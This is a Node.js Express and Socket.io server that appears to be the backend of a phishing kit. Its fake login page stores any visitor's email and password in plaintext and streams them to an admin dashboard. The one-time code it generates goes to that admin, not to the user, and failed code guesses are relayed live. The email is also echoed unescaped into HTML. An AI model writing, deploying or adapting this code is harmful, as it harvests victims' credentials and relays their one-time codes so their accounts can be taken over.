require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// Explicit routes for HTML pages
app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/login', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/otp', (req, res) => res.sendFile(path.join(publicPath, 'users/otp.html')));
app.get('/users/success', (req, res) => res.sendFile(path.join(publicPath, 'users/success.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(publicPath, 'admin/index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(publicPath, 'admin/dashboard.html')));

// Database configuration
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  connectionTimeoutMillis: 10000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true
});

// Test database connection
pool.connect((err, client, release) => {
  if (err) console.error('❌ Database connection error:', err.message);
  else {
    console.log('✅ Connected to Neon PostgreSQL database');
    release();
  }
});

// JWT middleware
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token provided' });
  
  const token = authHeader.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

// Socket.io authentication
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token) return next(new Error('Authentication error'));
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return next(new Error('Authentication error'));
    socket.user = user;
    next();
  });
});

// Socket.io connection
io.on('connection', (socket) => {
  console.log('👤 Admin connected:', socket.id);
  socket.on('disconnect', () => console.log('👤 Admin disconnected:', socket.id));
});

// Database initialization
async function initializeDatabase() {
  try {
    console.log('📦 Initializing database...');
    
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        otp VARCHAR(6),
        otp_attempts INTEGER DEFAULT 0,
        otp_verified BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Users table ready');

    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    console.log('✅ Admin table ready');

    // Create default admin
    const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
    if (adminExists.rows.length === 0) {
      await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', 
        [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
      console.log('✅ Default admin created');
    }

    return true;
  } catch (error) {
    console.error('❌ Database init error:', error.message);
    return false;
  }
}

// Generate OTP
const generateOTP = () => crypto.randomInt(100000, 999999).toString();

// USER ENDPOINTS

// User login
app.post('/api/users/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    // Save user with initial state
    await pool.query(`
      INSERT INTO users (email, password, otp_verified) 
      VALUES ($1, $2, false) 
      ON CONFLICT (email) DO UPDATE 
      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0
    `, [email, password]);

    // Generate and save OTP
    const otp = generateOTP();
    await pool.query('UPDATE users SET otp = $1 WHERE email = $2', [otp, email]);

    // Emit to admin
    io.emit('new-login', { email, otp, timestamp: new Date() });
    console.log('📢 New login - OTP generated for:', email);

    // Send loading page
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Loading...</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          }
          .loading-container {
            text-align: center;
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
          }
          .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
          }
          @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          .email { color: #667eea; font-weight: bold; }
        </style>
        <meta http-equiv="refresh" content="3;url=/users/otp?email=${encodeURIComponent(email)}">
      </head>
      <body>
        <div class="loading-container">
          <h2>Processing your request...</h2>
          <div class="spinner"></div>
          <p>Please wait, redirecting to OTP verification for <span class="email">${email}</span>...</p>
        </div>
      </body>
      </html>
    `);
  } catch (error) {
    console.error('❌ Login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Verify OTP with attempt tracking
app.post('/api/users/verify', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: 'Email and OTP required' });

    // Get user data
    const user = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
    if (user.rows.length === 0) return res.status(404).json({ error: 'User not found' });

    const userData = user.rows[0];
    
    // Check if already verified
    if (userData.otp_verified) {
      return res.json({ success: true, message: 'Already verified', redirect: '/users/success' });
    }

    // Check attempts
    if (userData.otp_attempts >= 3) {
      // Generate new OTP after 3 attempts
      const newOtp = generateOTP();
      await pool.query('UPDATE users SET otp = $1, otp_attempts = 0 WHERE email = $2', [newOtp, email]);
      io.emit('otp-regenerated', { email, otp: newOtp, reason: 'max_attempts', timestamp: new Date() });
      return res.status(400).json({ 
        error: 'Maximum attempts reached. New OTP has been generated and sent to admin.',
        newOtpGenerated: true
      });
    }

    // Verify OTP
    if (userData.otp === otp) {
      // Correct OTP
      await pool.query('UPDATE users SET otp_verified = true, otp_attempts = 0 WHERE email = $1', [email]);
      io.emit('otp-verified', { email, timestamp: new Date() });
      
      // Send loading page before success
      res.send(`
        <!DOCTYPE html>
        <html>
        <head>
          <title>Verifying...</title>
          <style>
            body {
              font-family: Arial, sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            }
            .loading-container {
              text-align: center;
              background: white;
              padding: 40px;
              border-radius: 10px;
              box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            }
            .spinner {
              border: 4px solid #f3f3f3;
              border-top: 4px solid #4CAF50;
              border-radius: 50%;
              width: 50px;
              height: 50px;
              animation: spin 1s linear infinite;
              margin: 20px auto;
            }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
            .checkmark {
              color: #4CAF50;
              font-size: 48px;
              margin: 10px 0;
            }
          </style>
          <meta http-equiv="refresh" content="3;url=/users/success?email=${encodeURIComponent(email)}">
        </head>
        <body>
          <div class="loading-container">
            <div class="checkmark">✓</div>
            <h2>OTP Verified Successfully!</h2>
            <div class="spinner"></div>
            <p>Please wait, redirecting...</p>
          </div>
        </body>
        </html>
      `);
    } else {
      // Wrong OTP - increment attempts
      const newAttempts = (userData.otp_attempts || 0) + 1;
      await pool.query('UPDATE users SET otp_attempts = $1 WHERE email = $2', [newAttempts, email]);
      
      // Notify admin of wrong attempt
      io.emit('wrong-otp-attempt', { 
        email, 
        attempt: newAttempts,
        wrongOtp: otp,
        timestamp: new Date() 
      });

      res.status(400).json({ 
        error: `Invalid OTP. Attempt ${newAttempts} of 3`,
        attempts: newAttempts
      });
    }
  } catch (error) {
    console.error('❌ Verify error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Resend OTP request
app.post('/api/users/resend', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    // Generate new OTP
    const newOtp = generateOTP();
    await pool.query('UPDATE users SET otp = $1, otp_attempts = 0 WHERE email = $2', [newOtp, email]);
    
    io.emit('resend-request', { email, otp: newOtp, timestamp: new Date() });
    console.log('📢 Resend request - new OTP for:', email);

    res.json({ success: true, message: 'New OTP generated and sent to admin' });
  } catch (error) {
    console.error('❌ Resend error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ADMIN ENDPOINTS

// Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    const result = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
    if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });

    const token = jwt.sign(
      { id: result.rows[0].id, email, role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.json({ token });
  } catch (error) {
    console.error('❌ Admin login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get all users with full details for admin
app.get('/api/admin/users', authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT 
        id, 
        email, 
        password,
        otp, 
        otp_attempts,
        otp_verified,
        created_at,
        updated_at
      FROM users 
      ORDER BY created_at DESC
    `);
    
    console.log(`📊 Found ${result.rows.length} users`);
    res.json(result.rows);
  } catch (error) {
    console.error('❌ Admin users error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get single user details
app.get('/api/admin/users/:email', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.params;
    const result = await pool.query(`
      SELECT 
        id, 
        email, 
        password,
        otp, 
        otp_attempts,
        otp_verified,
        created_at,
        updated_at
      FROM users 
      WHERE email = $1
    `, [email]);
    
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    res.json(result.rows[0]);
  } catch (error) {
    console.error('❌ Admin user detail error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    database: process.env.DATABASE_URL ? 'Configured' : 'Not configured',
    timestamp: new Date().toISOString()
  });
});

// Test database
app.get('/api/test-db', async (req, res) => {
  try {
    const result = await pool.query('SELECT NOW() as time');
    res.json({ success: true, time: result.rows[0].time });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Error handling
app.use((err, req, res, next) => {
  console.error('❌ Unhandled error:', err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use('/api/*', (req, res) => {
  res.status(404).json({ error: 'API endpoint not found' });
});

// Start server
const PORT = process.env.PORT || 3000;

initializeDatabase().then((success) => {
  if (success) {
    server.listen(PORT, '0.0.0.0', () => {
      console.log('\n🚀 Server started!');
      console.log(`📡 Port: ${PORT}`);
      console.log(`🔗 User login: /users/login`);
      console.log(`🔗 Admin login: /admin`);
    });
  } else {
    process.exit(1);
  }
});

// Graceful shutdown
process.on('SIGINT', () => {
  pool.end(() => process.exit(0));
});
process.on('SIGTERM', () => {
  pool.end(() => process.exit(0));
});
